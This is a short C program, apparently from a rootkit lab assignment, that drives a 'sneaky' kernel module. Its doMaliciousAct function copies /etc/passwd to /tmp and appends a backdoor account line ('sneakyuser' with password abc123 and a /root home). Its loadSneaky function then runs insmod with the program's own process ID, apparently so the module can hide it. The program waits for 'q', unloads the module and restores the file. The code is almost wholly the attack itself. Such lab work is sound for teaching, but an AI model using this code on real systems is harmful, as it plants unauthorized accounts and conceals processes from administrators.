#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
//printf the pid of the sneaky process
void displayPid() {
    printf("sneaky_process pid = %d\n", getpid());
}
// Perform a malicious act by copying the /etc/passwd file to /tmp/passwd
void doMaliciousAct() {
    system("cp /etc/passwd /tmp/passwd");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
}
// Load the sneaky kernel module by running an insmod command with the current process ID as an argument
void loadSneaky() {
    char insmod_command[1024];
    sprintf(insmod_command, "insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
    system(insmod_command);
}
// Wait for the user to enter 'q' before continuing execution
void readInput() {
    char c;
    while ((c = getchar()) != 'q') {
    }
}
// Unload the sneaky kernel module by running an rmmod command
void unloadSneaky() {
    system("rmmod sneaky_mod.ko");
}
//Restore the original /etc/passwd file by copying it back from /tmp/passwd and removing the temporary file
void restoreFile() {
    system("cp /tmp/passwd /etc/passwd");
    system("rm -rf /tmp/passwd");
}
int main() {
    displayPid();

    doMaliciousAct();

    loadSneaky();

    readInput();

    unloadSneaky();

    restoreFile();
    return EXIT_SUCCESS;
}
